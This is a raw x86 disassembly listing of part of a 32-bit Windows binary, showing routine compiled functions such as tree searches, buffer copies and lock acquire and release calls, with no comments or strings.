   15e6d:	mov    ecx,esi
   15e6f:	call   0x14d7c
   15e74:	push   DWORD PTR [ebp+0x8]
   15e77:	mov    ecx,esi
   15e79:	call   0x14b74
   15e7e:	mov    eax,esi
   15e80:	pop    esi
   15e81:	leave  
   15e82:	ret    0x4
   15e85:	int3   
   15e86:	int3   
   15e87:	int3   
   15e88:	int3   
   15e89:	int3   
   15e8a:	mov    edi,edi
   15e8c:	push   ebp
   15e8d:	mov    ebp,esp
   15e8f:	push   ecx
   15e90:	push   ebx
   15e91:	push   esi
   15e92:	push   edi
   15e93:	xor    edi,edi
   15e95:	push   edi
   15e96:	push   edi
   15e97:	push   edi
   15e98:	mov    esi,ecx
   15e9a:	mov    eax,DWORD PTR [esi+0x10]
   15e9d:	push   edi
   15e9e:	push   eax
   15e9f:	xor    ebx,ebx
   15ea1:	call   DWORD PTR ds:0x1f028
   15ea7:	test   eax,eax
   15ea9:	jge    0x15eaf
   15eab:	xor    eax,eax
   15ead:	jmp    0x15ed5
   15eaf:	lea    eax,[ebp+0x8]
   15eb2:	push   eax
   15eb3:	lea    eax,[ebp-0x4]
   15eb6:	push   eax
   15eb7:	mov    ecx,esi
   15eb9:	call   0x13c0c
   15ebe:	mov    eax,DWORD PTR [ebp-0x4]
   15ec1:	cmp    eax,DWORD PTR [esi+0x4]
   15ec4:	je     0x15ec9
   15ec6:	mov    ebx,DWORD PTR [eax+0x10]
   15ec9:	push   edi
   15eca:	push   DWORD PTR [esi+0x10]
   15ecd:	call   DWORD PTR ds:0x1f024
   15ed3:	mov    eax,ebx
   15ed5:	pop    edi
   15ed6:	pop    esi
   15ed7:	pop    ebx
   15ed8:	leave  
   15ed9:	ret    0x4
   15edc:	int3   
   15edd:	int3   
   15ede:	int3   
   15edf:	int3   
   15ee0:	int3   
   15ee1:	int3   
   15ee2:	push   0x10
   15ee4:	push   0x7e148
   15ee9:	call   0x1daf8
   15eee:	xor    ebx,ebx
   15ef0:	push   ebx
   15ef1:	push   ebx
   15ef2:	push   ebx
   15ef3:	push   ebx
   15ef4:	push   0x7e560
   15ef9:	call   DWORD PTR ds:0x1f028
   15eff:	cmp    eax,ebx
   15f01:	jl     0x15fbe
   15f07:	mov    DWORD PTR [ebp-0x4],ebx
   15f0a:	push   0xffffffff
   15f0c:	push   0x1df10
   15f11:	lea    ecx,[ebp-0x20]
   15f14:	call   0x110b8
   15f19:	mov    esi,DWORD PTR [ebp+0x8]
   15f1c:	push   esi
   15f1d:	lea    eax,[ebp+0x8]
   15f20:	push   eax
   15f21:	mov    ecx,DWORD PTR ds:0x7e530
   15f27:	call   0x14c00
   15f2c:	mov    eax,ds:0x7e530
   15f31:	mov    eax,DWORD PTR [eax+0x4]
   15f34:	mov    ecx,DWORD PTR [ebp+0x8]
   15f37:	cmp    ecx,eax
   15f39:	je     0x15f47
   15f3b:	add    ecx,0x14
   15f3e:	push   ecx
   15f3f:	lea    ecx,[ebp-0x20]
   15f42:	call   0x129fc
   15f47:	mov    edx,DWORD PTR [esi+0x4]
   15f4a:	mov    eax,DWORD PTR [ebp-0x1c]
   15f4d:	lea    ecx,[eax+edx*1+0x2]
   15f51:	mov    eax,DWORD PTR [ebp+0xc]
   15f54:	cmp    ecx,DWORD PTR [eax]
   15f56:	jbe    0x15f63
   15f58:	mov    DWORD PTR [eax],ecx
   15f5a:	mov    DWORD PTR [eax+0x8],0x2
   15f61:	jmp    0x15f86
   15f63:	mov    DWORD PTR [eax+0x8],ebx
   15f66:	mov    esi,DWORD PTR [esi]
   15f68:	lea    edi,[eax+0xc]
   15f6b:	mov    cl,BYTE PTR [esi]
   15f6d:	mov    BYTE PTR [edi],cl
   15f6f:	inc    esi
   15f70:	inc    edi
   15f71:	cmp    cl,bl
   15f73:	jne    0x15f6b
   15f75:	mov    esi,DWORD PTR [ebp-0x20]
   15f78:	lea    eax,[edx+eax*1+0xd]
   15f7c:	mov    cl,BYTE PTR [esi]
   15f7e:	mov    BYTE PTR [eax],cl
   15f80:	inc    esi
   15f81:	inc    eax
   15f82:	cmp    cl,bl
   15f84:	jne    0x15f7c
   15f86:	push   DWORD PTR [ebp-0x20]
   15f89:	call   0x10a86
   15f8e:	pop    ecx
   15f8f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f96:	jmp    0x15fb2
   15f98:	xor    eax,eax
   15f9a:	inc    eax
   15f9b:	ret    
   15f9c:	mov    esp,DWORD PTR [ebp-0x18]
   15f9f:	mov    eax,DWORD PTR [ebp+0xc]
   15fa2:	mov    DWORD PTR [eax+0x8],0x4
   15fa9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15fb0:	xor    ebx,ebx
   15fb2:	push   ebx
   15fb3:	push   0x7e560
   15fb8:	call   DWORD PTR ds:0x1f024
   15fbe:	call   0x1db3d
   15fc3:	ret    0x8
   15fc6:	int3   
   15fc7:	int3   
   15fc8:	int3   
   15fc9:	int3   
   15fca:	int3   
   15fcb:	int3   
   15fcc:	push   0xc
   15fce:	push   0x7e168
   15fd3:	call   0x1daf8
   15fd8:	xor    edi,edi
   15fda:	push   edi
   15fdb:	push   edi
   15fdc:	push   edi
   15fdd:	push   edi
   15fde:	push   0x7e560
   15fe3:	call   DWORD PTR ds:0x1f028
   15fe9:	cmp    eax,edi
   15feb:	jl     0x1609a
   15ff1:	mov    DWORD PTR [ebp-0x4],edi
   15ff4:	lea    eax,[ebp+0x8]
   15ff7:	push   eax
   15ff8:	lea    eax,[ebp-0x1c]
   15ffb:	push   eax
   15ffc:	mov    esi,DWORD PTR ds:0x7e5bc
   16002:	mov    ecx,esi
   16004:	call   0x13cde
   16009:	mov    esi,DWORD PTR [esi+0x4]
   1600c:	mov    ecx,DWORD PTR [ebp-0x1c]
   1600f:	cmp    ecx,esi
   16011:	jne    0x1601f
   16013:	mov    eax,DWORD PTR [ebp+0xc]
   16016:	mov    DWORD PTR [eax+0x8],0x1
   1601d:	jmp    0x1606b
   1601f:	mov    eax,DWORD PTR [ecx+0x10]
   16022:	cmp    eax,edi
   16024:	jne    0x1602a
   16026:	xor    edx,edx
   16028:	jmp    0x1602d
   1602a:	mov    edx,DWORD PTR [eax+0x8]
   1602d:	mov    eax,DWORD PTR [ebp+0xc]
   16030:	cmp    edx,DWORD PTR [eax]
   16032:	jbe    0x1603f
   16034:	mov    DWORD PTR [eax],edx
   16036:	mov    DWORD PTR [eax+0x8],0x2
   1603d:	jmp    0x1606b
   1603f:	mov    DWORD PTR [eax+0x8],edi
   16042:	mov    edx,DWORD PTR [ecx+0x10]
   16045:	cmp    edx,edi
   16047:	jne    0x1604d
   16049:	xor    edx,edx
   1604b:	jmp    0x16050
   1604d:	mov    edx,DWORD PTR [edx+0x8]
   16050:	mov    ecx,DWORD PTR [ecx+0x10]
   16053:	cmp    ecx,edi
   16055:	jne    0x1605b
   16057:	xor    ecx,ecx
   16059:	jmp    0x1605d
   1605b:	mov    ecx,DWORD PTR [ecx]
   1605d:	push   edx
   1605e:	push   ecx
   1605f:	add    eax,0xc
   16062:	push   eax
   16063:	call   0x1dac6
   16068:	add    esp,0xc
   1606b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16072:	jmp    0x1608e
   16074:	xor    eax,eax
   16076:	inc    eax
   16077:	ret    
   16078:	mov    esp,DWORD PTR [ebp-0x18]
   1607b:	mov    eax,DWORD PTR [ebp+0xc]
   1607e:	mov    DWORD PTR [eax+0x8],0x4
   16085:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1608c:	xor    edi,edi
   1608e:	push   edi
   1608f:	push   0x7e560
   16094:	call   DWORD PTR ds:0x1f024
   1609a:	call   0x1db3d
   1609f:	ret    0x8
   160a2:	int3   
   160a3:	int3   
   160a4:	int3   
   160a5:	int3   
   160a6:	int3   
   160a7:	int3   
   160a8:	mov    edi,edi
   160aa:	push   ebp
   160ab:	mov    ebp,esp
   160ad:	push   ebx
   160ae:	push   esi
   160af:	push   DWORD PTR [ebp+0x8]
   160b2:	mov    esi,ecx
   160b4:	lea    eax,[ebp+0x8]
   160b7:	push   eax
   160b8:	lea    ecx,[esi+0x4]
   160bb:	xor    bl,bl
   160bd:	call   0x13d40
   160c2:	mov    eax,DWORD PTR [ebp+0x8]
   160c5:	cmp    eax,DWORD PTR [esi+0x8]
   160c8:	je     0x160d8
   160ca:	mov    ecx,DWORD PTR [ebp+0xc]
   160cd:	add    eax,0x18
   160d0:	push   eax
   160d1:	call   0x12a8a
   160d6:	inc    bl
   160d8:	pop    esi
   160d9:	mov    al,bl
   160db:	pop    ebx
   160dc:	pop    ebp
   160dd:	ret    0x8
   160e0:	int3   
   160e1:	int3   
   160e2:	int3   
   160e3:	int3   
   160e4:	int3   
   160e5:	int3   
   160e6:	mov    edi,edi
   160e8:	push   ebp
   160e9:	mov    ebp,esp
   160eb:	push   ecx
   160ec:	push   ecx
   160ed:	push   DWORD PTR [ebp+0xc]
   160f0:	lea    eax,[ebp-0x8]
   160f3:	push   eax
   160f4:	call   0x14ce4
   160f9:	mov    eax,DWORD PTR [ebp+0x8]
   160fc:	mov    ecx,DWORD PTR [ebp-0x8]
   160ff:	mov    DWORD PTR [eax],ecx
   16101:	mov    cl,BYTE PTR [ebp-0x4]
   16104:	mov    BYTE PTR [eax+0x4],cl
   16107:	leave  
   16108:	ret    0x8
   1610b:	int3   
   1610c:	int3   
   1610d:	int3   
   1610e:	int3   
   1610f:	int3   
   16110:	mov    edi,edi
   16112:	push   ebp
   16113:	mov    ebp,esp
   16115:	push   ecx
   16116:	push   esi
   16117:	mov    esi,ecx
   16119:	mov    eax,DWORD PTR [esi+0x4]
   1611c:	mov    ecx,DWORD PTR [eax]
   1611e:	push   eax
   1611f:	push   ecx
   16120:	lea    eax,[ebp-0x4]
   16123:	push   eax
   16124:	mov    ecx,esi
   16126:	call   0x14d7c
   1612b:	push   DWORD PTR [esi+0x4]
   1612e:	call   0x10a86
   16133:	xor    eax,eax
   16135:	mov    DWORD PTR [esi+0x4],eax
   16138:	mov    DWORD PTR [esi+0xc],eax
   1613b:	dec    DWORD PTR ds:0x7fa28
   16141:	pop    ecx
   16142:	pop    esi
   16143:	jne    0x1615b
   16145:	mov    ecx,DWORD PTR ds:0x7f8bc
   1614b:	mov    ds:0x7f8bc,eax
   16150:	cmp    ecx,eax
   16152:	je     0x1615b
   16154:	push   ecx
   16155:	call   0x10a86
   1615a:	pop    ecx
   1615b:	leave  
   1615c:	ret    
   1615d:	int3   
   1615e:	int3   
   1615f:	int3   
   16160:	int3   
   16161:	int3   
   16162:	mov    edi,edi
   16164:	push   ebp
   16165:	mov    ebp,esp
   16167:	push   ecx
   16168:	push   ecx
   16169:	push   DWORD PTR [ebp+0xc]
   1616c:	lea    eax,[ebp-0x8]
   1616f:	push   eax
   16170:	call   0x14e44
   16175:	mov    eax,DWORD PTR [ebp+0x8]
   16178:	mov    ecx,DWORD PTR [ebp-0x8]
   1617b:	mov    DWORD PTR [eax],ecx
   1617d:	mov    cl,BYTE PTR [ebp-0x4]
   16180:	mov    BYTE PTR [eax+0x4],cl
   16183:	leave  
   16184:	ret    0x8
   16187:	int3   
   16188:	int3   
   16189:	int3   
   1618a:	int3   
   1618b:	int3   
   1618c:	mov    edi,edi
   1618e:	push   ebp
   1618f:	mov    ebp,esp
   16191:	push   ecx
   16192:	push   ecx
   16193:	push   DWORD PTR [ebp+0x8]
   16196:	lea    eax,[ebp-0x8]
   16199:	push   eax
   1619a:	call   0x14074
   1619f:	and    DWORD PTR [ebp+0x8],0x0
   161a3:	lea    eax,[ebp+0x8]
   161a6:	push   eax
   161a7:	push   DWORD PTR [ebp-0x4]
   161aa:	push   DWORD PTR [ebp-0x8]
   161ad:	call   0x15e06
   161b2:	mov    eax,DWORD PTR [ebp+0x8]
   161b5:	add    esp,0xc
   161b8:	leave  
   161b9:	ret    0x4
   161bc:	int3   
   161bd:	int3   
   161be:	int3   
   161bf:	int3   
   161c0:	int3   
   161c1:	int3   
   161c2:	mov    edi,edi
   161c4:	push   ebp
   161c5:	mov    ebp,esp
   161c7:	push   ecx
   161c8:	push   ecx
   161c9:	push   esi
   161ca:	push   DWORD PTR [ebp+0x8]
   161cd:	lea    eax,[ebp-0x8]
   161d0:	push   eax
   161d1:	mov    esi,ecx
   161d3:	call   0x14108
   161d8:	and    DWORD PTR [ebp+0x8],0x0
   161dc:	lea    eax,[ebp+0x8]
   161df:	push   eax
   161e0:	push   DWORD PTR [ebp-0x4]
   161e3:	push   DWORD PTR [ebp-0x8]
   161e6:	call   0x13a70
   161eb:	add    esp,0xc
   161ee:	push   DWORD PTR [ebp-0x4]
   161f1:	lea    eax,[ebp-0x4]
   161f4:	push   DWORD PTR [ebp-0x8]
   161f7:	mov    ecx,esi
   161f9:	push   eax
   161fa:	call   0x14edc
   161ff:	mov    eax,DWORD PTR [ebp+0x8]
   16202:	pop    esi
   16203:	leave  
   16204:	ret    0x4
   16207:	int3   
   16208:	int3   
   16209:	int3   
   1620a:	int3   
   1620b:	int3   
   1620c:	mov    edi,edi
   1620e:	push   ebp
   1620f:	mov    ebp,esp
   16211:	push   ecx
   16212:	push   ebx
   16213:	push   esi
   16214:	push   edi
   16215:	mov    edi,ecx
   16217:	mov    eax,DWORD PTR [edi+0x4]
   1621a:	mov    esi,DWORD PTR [eax+0x4]
   1621d:	mov    ebx,eax
   1621f:	mov    al,0x1
   16221:	jmp    0x1623c
   16223:	lea    eax,[esi+0x10]
   16226:	push   eax
   16227:	push   DWORD PTR [ebp+0xc]
   1622a:	mov    ebx,esi
   1622c:	call   0x197f4
   16231:	test   al,al
   16233:	je     0x16239
   16235:	mov    esi,DWORD PTR [esi]
   16237:	jmp    0x1623c
   16239:	mov    esi,DWORD PTR [esi+0x8]
   1623c:	cmp    esi,DWORD PTR ds:0x7f8c0
   16242:	jne    0x16223
   16244:	cmp    BYTE PTR [edi+0x8],0x0
   16248:	je     0x16265
   1624a:	push   DWORD PTR [ebp+0xc]
   1624d:	lea    eax,[ebp+0xc]
   16250:	push   ebx
   16251:	push   esi
   16252:	push   eax
   16253:	mov    ecx,edi
   16255:	call   0x15206
   1625a:	mov    ecx,DWORD PTR [eax]
   1625c:	mov    eax,DWORD PTR [ebp+0x8]
   1625f:	mov    BYTE PTR [eax+0x4],0x1
   16263:	jmp    0x16298
   16265:	mov    DWORD PTR [ebp-0x4],ebx
   16268:	test   al,al
   1626a:	je     0x1627b
   1626c:	mov    eax,DWORD PTR [edi+0x4]
   1626f:	cmp    ebx,DWORD PTR [eax]
   16271:	je     0x1624a
   16273:	lea    ecx,[ebp-0x4]
   16276:	call   0x11512
   1627b:	push   DWORD PTR [ebp+0xc]
   1627e:	mov    eax,DWORD PTR [ebp-0x4]
   16281:	add    eax,0x10
   16284:	push   eax
   16285:	call   0x197f4
   1628a:	test   al,al
   1628c:	jne    0x1624a
   1628e:	mov    eax,DWORD PTR [ebp+0x8]
   16291:	mov    ecx,DWORD PTR [ebp-0x4]
   16294:	mov    BYTE PTR [eax+0x4],0x0
   16298:	pop    edi
   16299:	pop    esi
   1629a:	mov    DWORD PTR [eax],ecx
   1629c:	pop    ebx
   1629d:	leave  
   1629e:	ret    0x8
   162a1:	int3   
   162a2:	int3   
   162a3:	int3   
   162a4:	int3   
   162a5:	int3   
   162a6:	mov    edi,edi
   162a8:	push   ebp
   162a9:	mov    ebp,esp
   162ab:	push   ecx
   162ac:	push   esi
   162ad:	mov    esi,ecx
   162af:	cmp    DWORD PTR [esi+0xc],0x0
   162b3:	mov    ecx,DWORD PTR [ebp+0xc]
   162b6:	je     0x162f0
   162b8:	mov    eax,DWORD PTR [esi+0x4]
   162bb:	cmp    ecx,DWORD PTR [eax]
   162bd:	jne    0x162f0
   162bf:	cmp    DWORD PTR [ebp+0x10],eax
   162c2:	jne    0x162f0
   162c4:	push   DWORD PTR [eax+0x4]
   162c7:	mov    ecx,esi
   162c9:	call   0x151bc
   162ce:	mov    ecx,DWORD PTR ds:0x7f8c0
   162d4:	mov    eax,DWORD PTR [esi+0x4]
   162d7:	mov    DWORD PTR [eax+0x4],ecx
   162da:	mov    eax,DWORD PTR [esi+0x4]
   162dd:	and    DWORD PTR [esi+0xc],0x0
   162e1:	mov    DWORD PTR [eax],eax
   162e3:	mov    eax,DWORD PTR [esi+0x4]
   162e6:	mov    DWORD PTR [eax+0x8],eax
   162e9:	mov    eax,DWORD PTR [esi+0x4]
   162ec:	mov    ecx,DWORD PTR [eax]
   162ee:	jmp    0x16315
   162f0:	cmp    ecx,DWORD PTR [ebp+0x10]
   162f3:	je     0x16315
   162f5:	push   edi
   162f6:	mov    edi,ecx
   162f8:	lea    ecx,[ebp+0xc]
   162fb:	call   0x12ed2
   16300:	push   edi
   16301:	lea    eax,[ebp-0x4]
   16304:	push   eax
   16305:	mov    ecx,esi
   16307:	call   0x14f5a
   1630c:	mov    ecx,DWORD PTR [ebp+0xc]
   1630f:	cmp    ecx,DWORD PTR [ebp+0x10]
   16312:	jne    0x162f6
   16314:	pop    edi
   16315:	mov    eax,DWORD PTR [ebp+0x8]
   16318:	mov    DWORD PTR [eax],ecx
   1631a:	pop    esi
   1631b:	leave  
   1631c:	ret    0xc
   1631f:	int3   
   16320:	int3   
   16321:	int3   
   16322:	int3   
   16323:	int3   
   16324:	mov    edi,edi
   16326:	push   ebp
   16327:	mov    ebp,esp
   16329:	push   ecx
   1632a:	push   ebx
   1632b:	push   esi
   1632c:	push   edi
   1632d:	mov    edi,ecx
   1632f:	mov    eax,DWORD PTR [edi+0x4]
   16332:	mov    esi,DWORD PTR [eax+0x4]
   16335:	mov    ebx,eax
   16337:	mov    al,0x1
   16339:	jmp    0x16354
   1633b:	lea    eax,[esi+0x10]
   1633e:	push   eax
   1633f:	push   DWORD PTR [ebp+0xc]
   16342:	mov    ebx,esi
   16344:	call   0x197f4
   16349:	test   al,al
   1634b:	je     0x16351
   1634d:	mov    esi,DWORD PTR [esi]
   1634f:	jmp    0x16354
   16351:	mov    esi,DWORD PTR [esi+0x8]
   16354:	cmp    esi,DWORD PTR ds:0x7f8c4
   1635a:	jne    0x1633b
   1635c:	cmp    BYTE PTR [edi+0x8],0x0
   16360:	je     0x1637d
   16362:	push   DWORD PTR [ebp+0xc]
   16365:	lea    eax,[ebp+0xc]
   16368:	push   ebx
   16369:	push   esi
   1636a:	push   eax
   1636b:	mov    ecx,edi
   1636d:	call   0x15608
   16372:	mov    ecx,DWORD PTR [eax]
   16374:	mov    eax,DWORD PTR [ebp+0x8]
   16377:	mov    BYTE PTR [eax+0x4],0x1
   1637b:	jmp    0x163b0
   1637d:	mov    DWORD PTR [ebp-0x4],ebx
   16380:	test   al,al
   16382:	je     0x16393
   16384:	mov    eax,DWORD PTR [edi+0x4]
   16387:	cmp    ebx,DWORD PTR [eax]
   16389:	je     0x16362
   1638b:	lea    ecx,[ebp-0x4]
   1638e:	call   0x113ca
   16393:	push   DWORD PTR [ebp+0xc]
   16396:	mov    eax,DWORD PTR [ebp-0x4]
   16399:	add    eax,0x10
   1639c:	push   eax
   1639d:	call   0x197f4
   163a2:	test   al,al
   163a4:	jne    0x16362
   163a6:	mov    eax,DWORD PTR [ebp+0x8]
   163a9:	mov    ecx,DWORD PTR [ebp-0x4]
   163ac:	mov    BYTE PTR [eax+0x4],0x0
   163b0:	pop    edi
   163b1:	pop    esi
   163b2:	mov    DWORD PTR [eax],ecx
   163b4:	pop    ebx
   163b5:	leave  
   163b6:	ret    0x8
   163b9:	int3   
   163ba:	int3   
   163bb:	int3   
   163bc:	int3   
   163bd:	int3   
   163be:	mov    edi,edi
   163c0:	push   ebp
   163c1:	mov    ebp,esp
   163c3:	push   ecx
   163c4:	push   esi
   163c5:	mov    esi,ecx
   163c7:	cmp    DWORD PTR [esi+0xc],0x0
   163cb:	mov    ecx,DWORD PTR [ebp+0xc]
   163ce:	je     0x16408
   163d0:	mov    eax,DWORD PTR [esi+0x4]
   163d3:	cmp    ecx,DWORD PTR [eax]
   163d5:	jne    0x16408
   163d7:	cmp    DWORD PTR [ebp+0x10],eax
   163da:	jne    0x16408
   163dc:	push   DWORD PTR [eax+0x4]
   163df:	mov    ecx,esi
   163e1:	call   0x155be
   163e6:	mov    ecx,DWORD PTR ds:0x7f8c4
   163ec:	mov    eax,DWORD PTR [esi+0x4]
   163ef:	mov    DWORD PTR [eax+0x4],ecx
   163f2:	mov    eax,DWORD PTR [esi+0x4]
   163f5:	and    DWORD PTR [esi+0xc],0x0
   163f9:	mov    DWORD PTR [eax],eax
   163fb:	mov    eax,DWORD PTR [esi+0x4]
   163fe:	mov    DWORD PTR [eax+0x8],eax
   16401:	mov    eax,DWORD PTR [esi+0x4]
   16404:	mov    ecx,DWORD PTR [eax]
   16406:	jmp    0x1642d
   16408:	cmp    ecx,DWORD PTR [ebp+0x10]
   1640b:	je     0x1642d
   1640d:	push   edi
   1640e:	mov    edi,ecx
   16410:	lea    ecx,[ebp+0xc]
   16413:	call   0x13890
   16418:	push   edi
   16419:	lea    eax,[ebp-0x4]
   1641c:	push   eax
   1641d:	mov    ecx,esi
   1641f:	call   0x1535c
   16424:	mov    ecx,DWORD PTR [ebp+0xc]
   16427:	cmp    ecx,DWORD PTR [ebp+0x10]
   1642a:	jne    0x1640e
   1642c:	pop    edi
   1642d:	mov    eax,DWORD PTR [ebp+0x8]
   16430:	mov    DWORD PTR [eax],ecx
   16432:	pop    esi
   16433:	leave  
   16434:	ret    0xc
   16437:	int3   
   16438:	int3   
   16439:	int3   
   1643a:	int3   
   1643b:	int3   
   1643c:	mov    edi,edi
   1643e:	push   ebp
   1643f:	mov    ebp,esp
   16441:	push   ecx
   16442:	push   ebx
   16443:	push   esi
   16444:	push   edi
   16445:	mov    edi,ecx
   16447:	mov    eax,DWORD PTR [edi+0x4]
   1644a:	mov    esi,DWORD PTR [eax+0x4]
   1644d:	mov    ebx,eax
   1644f:	mov    al,0x1
   16451:	jmp    0x1646c
   16453:	lea    eax,[esi+0xc]
   16456:	push   eax
   16457:	push   DWORD PTR [ebp+0xc]
   1645a:	mov    ebx,esi
   1645c:	call   0x197f4
   16461:	test   al,al
   16463:	je     0x16469
   16465:	mov    esi,DWORD PTR [esi]
   16467:	jmp    0x1646c
   16469:	mov    esi,DWORD PTR [esi+0x8]
   1646c:	cmp    esi,DWORD PTR ds:0x7f8c8
   16472:	jne    0x16453
   16474:	cmp    BYTE PTR [edi+0x8],0x0
   16478:	je     0x16495
   1647a:	push   DWORD PTR [ebp+0xc]
   1647d:	lea    eax,[ebp+0xc]
   16480:	push   ebx
   16481:	push   esi
   16482:	push   eax
   16483:	mov    ecx,edi
   16485:	call   0x1575e
   1648a:	mov    ecx,DWORD PTR [eax]
   1648c:	mov    eax,DWORD PTR [ebp+0x8]
   1648f:	mov    BYTE PTR [eax+0x4],0x1
   16493:	jmp    0x164c8
   16495:	mov    DWORD PTR [ebp-0x4],ebx
   16498:	test   al,al
   1649a:	je     0x164ab
   1649c:	mov    eax,DWORD PTR [edi+0x4]
   1649f:	cmp    ebx,DWORD PTR [eax]
   164a1:	je     0x1647a
   164a3:	lea    ecx,[ebp-0x4]
   164a6:	call   0x1144e
   164ab:	push   DWORD PTR [ebp+0xc]
   164ae:	mov    eax,DWORD PTR [ebp-0x4]
   164b1:	add    eax,0xc
   164b4:	push   eax
   164b5:	call   0x197f4
   164ba:	test   al,al
   164bc:	jne    0x1647a
   164be:	mov    eax,DWORD PTR [ebp+0x8]
   164c1:	mov    ecx,DWORD PTR [ebp-0x4]
   164c4:	mov    BYTE PTR [eax+0x4],0x0
   164c8:	pop    edi
   164c9:	pop    esi
   164ca:	mov    DWORD PTR [eax],ecx
   164cc:	pop    ebx
   164cd:	leave  
   164ce:	ret    0x8
   164d1:	int3   
   164d2:	int3   
   164d3:	int3   
   164d4:	int3   
   164d5:	int3   
   164d6:	mov    edi,edi
   164d8:	push   ebp
   164d9:	mov    ebp,esp
   164db:	push   ecx
   164dc:	push   ebx
   164dd:	push   esi
   164de:	push   edi
   164df:	mov    edi,ecx
   164e1:	mov    eax,DWORD PTR [edi+0x4]
   164e4:	mov    esi,DWORD PTR [eax+0x4]
   164e7:	mov    ebx,eax
   164e9:	mov    eax,ds:0x7f8cc
   164ee:	mov    dl,0x1
   164f0:	cmp    esi,eax
   164f2:	je     0x16510
   164f4:	mov    ecx,DWORD PTR [ebp+0xc]
   164f7:	mov    ecx,DWORD PTR [ecx]
   164f9:	cmp    ecx,DWORD PTR [esi+0xc]
   164fc:	mov    ebx,esi
   164fe:	setl   dl
   16501:	test   dl,dl
   16503:	je     0x16509
   16505:	mov    esi,DWORD PTR [esi]
   16507:	jmp    0x1650c
   16509:	mov    esi,DWORD PTR [esi+0x8]
   1650c:	cmp    esi,eax
   1650e:	jne    0x164f9
   16510:	cmp    BYTE PTR [edi+0x8],0x0
   16514:	je     0x16531
   16516:	push   DWORD PTR [ebp+0xc]
   16519:	push   ebx
   1651a:	push   esi
   1651b:	lea    eax,[ebp+0xc]
   1651e:	push   eax
   1651f:	mov    ecx,edi
   16521:	call   0x15b60
   16526:	mov    ecx,DWORD PTR [eax]
   16528:	mov    eax,DWORD PTR [ebp+0x8]
   1652b:	mov    BYTE PTR [eax+0x4],0x1
   1652f:	jmp    0x16560
   16531:	mov    ecx,ebx
   16533:	mov    DWORD PTR [ebp-0x4],ecx
   16536:	test   dl,dl
   16538:	je     0x1654c
   1653a:	mov    eax,DWORD PTR [edi+0x4]
   1653d:	cmp    ebx,DWORD PTR [eax]
   1653f:	je     0x16516
   16541:	lea    ecx,[ebp-0x4]
   16544:	call   0x114d2
   16549:	mov    ecx,DWORD PTR [ebp-0x4]
   1654c:	mov    edx,DWORD PTR [ecx+0xc]
   1654f:	mov    eax,DWORD PTR [ebp+0xc]
   16552:	cmp    edx,DWORD PTR [eax]
   16554:	jge    0x16559
   16556:	push   eax
   16557:	jmp    0x16519
   16559:	mov    eax,DWORD PTR [ebp+0x8]
   1655c:	mov    BYTE PTR [eax+0x4],0x0
   16560:	pop    edi
   16561:	pop    esi
   16562:	mov    DWORD PTR [eax],ecx
   16564:	pop    ebx
   16565:	leave  
   16566:	ret    0x8
   16569:	int3   
   1656a:	int3   
   1656b:	int3   
   1656c:	int3   
   1656d:	int3   
   1656e:	mov    edi,edi
   16570:	push   ebp
   16571:	mov    ebp,esp
   16573:	push   ecx
   16574:	push   esi
   16575:	mov    esi,ecx
   16577:	cmp    DWORD PTR [esi+0xc],0x0
   1657b:	mov    ecx,DWORD PTR [ebp+0xc]
   1657e:	je     0x165b8
   16580:	mov    eax,DWORD PTR [esi+0x4]
   16583:	cmp    ecx,DWORD PTR [eax]
   16585:	jne    0x165b8
   16587:	cmp    DWORD PTR [ebp+0x10],eax
   1658a:	jne    0x165b8
   1658c:	push   DWORD PTR [eax+0x4]
   1658f:	mov    ecx,esi
   16591:	call   0x15b16
   16596:	mov    ecx,DWORD PTR ds:0x7f8cc
   1659c:	mov    eax,DWORD PTR [esi+0x4]
   1659f:	mov    DWORD PTR [eax+0x4],ecx
   165a2:	mov    eax,DWORD PTR [esi+0x4]
   165a5:	and    DWORD PTR [esi+0xc],0x0
   165a9:	mov    DWORD PTR [eax],eax
   165ab:	mov    eax,DWORD PTR [esi+0x4]
   165ae:	mov    DWORD PTR [eax+0x8],eax
   165b1:	mov    eax,DWORD PTR [esi+0x4]
   165b4:	mov    ecx,DWORD PTR [eax]
   165b6:	jmp    0x165dd
   165b8:	cmp    ecx,DWORD PTR [ebp+0x10]
   165bb:	je     0x165dd
   165bd:	push   edi
   165be:	mov    edi,ecx
   165c0:	lea    ecx,[ebp+0xc]
   165c3:	call   0x11588
   165c8:	push   edi
   165c9:	lea    eax,[ebp-0x4]
   165cc:	push   eax
   165cd:	mov    ecx,esi
   165cf:	call   0x158b4
   165d4:	mov    ecx,DWORD PTR [ebp+0xc]
   165d7:	cmp    ecx,DWORD PTR [ebp+0x10]
   165da:	jne    0x165be
   165dc:	pop    edi
   165dd:	mov    eax,DWORD PTR [ebp+0x8]
   165e0:	mov    DWORD PTR [eax],ecx
   165e2:	pop    esi
   165e3:	leave  
   165e4:	ret    0xc
   165e7:	int3   
   165e8:	int3   
   165e9:	int3   
   165ea:	int3   
   165eb:	int3   
   165ec:	mov    edi,edi
   165ee:	push   ebp
   165ef:	mov    ebp,esp
   165f1:	push   ecx
   165f2:	push   ebx
   165f3:	push   esi
   165f4:	push   edi
   165f5:	mov    edi,ecx
   165f7:	mov    eax,DWORD PTR [edi+0x4]
   165fa:	mov    esi,DWORD PTR [eax+0x4]
   165fd:	mov    ebx,eax
   165ff:	mov    al,0x1
   16601:	jmp    0x1661c
   16603:	lea    eax,[esi+0xc]
   16606:	push   eax
   16607:	push   DWORD PTR [ebp+0xc]
   1660a:	mov    ebx,esi
   1660c:	call   0x19824
   16611:	test   al,al
   16613:	je     0x16619
   16615:	mov    esi,DWORD PTR [esi]
   16617:	jmp    0x1661c
   16619:	mov    esi,DWORD PTR [esi+0x8]
   1661c:	cmp    esi,DWORD PTR ds:0x7f8d4
   16622:	jne    0x16603
   16624:	cmp    BYTE PTR [edi+0x8],0x0
   16628:	je     0x16645
   1662a:	push   DWORD PTR [ebp+0xc]
   1662d:	lea    eax,[ebp+0xc]
   16630:	push   ebx
   16631:	push   esi
   16632:	push   eax
   16633:	mov    ecx,edi
   16635:	call   0x15cb0
   1663a:	mov    ecx,DWORD PTR [eax]
   1663c:	mov    eax,DWORD PTR [ebp+0x8]
   1663f:	mov    BYTE PTR [eax+0x4],0x1
   16643:	jmp    0x16678
   16645:	mov    DWORD PTR [ebp-0x4],ebx
   16648:	test   al,al
   1664a:	je     0x1665b
   1664c:	mov    eax,DWORD PTR [edi+0x4]
